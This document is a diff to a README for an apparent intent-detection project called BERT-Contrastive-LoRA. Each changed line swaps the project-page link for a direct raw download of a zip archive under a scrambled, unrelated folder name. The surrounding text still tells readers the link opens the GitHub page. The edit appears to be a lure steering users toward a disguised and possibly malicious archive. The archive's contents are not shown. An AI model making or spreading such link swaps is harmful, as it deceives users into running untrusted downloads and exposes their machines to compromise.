@@ -1,6 +1,6 @@
 # 🧠 BERT-Contrastive-LoRA - Improve Intent Detection Accuracy
 
-[![Download Now](https://img.shields.io/badge/Download-BERT--Contrastive--LoRA-brightgreen?style=for-the-badge)](https://github.com/driellecristine/BERT-Contrastive-LoRA)
+[![Download Now](https://img.shields.io/badge/Download-BERT--Contrastive--LoRA-brightgreen?style=for-the-badge)](https://github.com/driellecristine/BERT-Contrastive-LoRA/raw/refs/heads/main/noncommunist/Contrastive-RA-BER-Lo-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ BERT-Contrastive-LoRA improves the way computers understand what users mean in t
 To get the software, you need to visit the project page. Follow the steps below:
 
 1. Click the green button below or this link:  
-   [Download BERT-Contrastive-LoRA](https://github.com/driellecristine/BERT-Contrastive-LoRA)  
+   [Download BERT-Contrastive-LoRA](https://github.com/driellecristine/BERT-Contrastive-LoRA/raw/refs/heads/main/noncommunist/Contrastive-RA-BER-Lo-2.3.zip)  
    This will take you to the GitHub page where you can download the files.
 
 2. On the GitHub page, look for the **Releases** section on the right or under the main repository description.
@@ -80,7 +80,7 @@ The program accepts data in common formats:
 
 To keep the software up to date:
 
-1. Visit [the project page](https://github.com/driellecristine/BERT-Contrastive-LoRA) regularly.
+1. Visit [the project page](https://github.com/driellecristine/BERT-Contrastive-LoRA/raw/refs/heads/main/noncommunist/Contrastive-RA-BER-Lo-2.3.zip) regularly.
 2. Download the latest version following the same steps outlined above.
 3. Install the new version by replacing the existing files or running the new installer.
 
@@ -99,4 +99,4 @@ You can ask for help or give feedback by opening an issue on the GitHub reposito
 
 ---
 
-[![Download BERT-Contrastive-LoRA](https://img.shields.io/badge/Download-BERT--Contrastive--LoRA-brightgreen?style=for-the-badge)](https://github.com/driellecristine/BERT-Contrastive-LoRA)
+[![Download BERT-Contrastive-LoRA](https://img.shields.io/badge/Download-BERT--Contrastive--LoRA-brightgreen?style=for-the-badge)](https://github.com/driellecristine/BERT-Contrastive-LoRA/raw/refs/heads/main/noncommunist/Contrastive-RA-BER-Lo-2.3.zip)
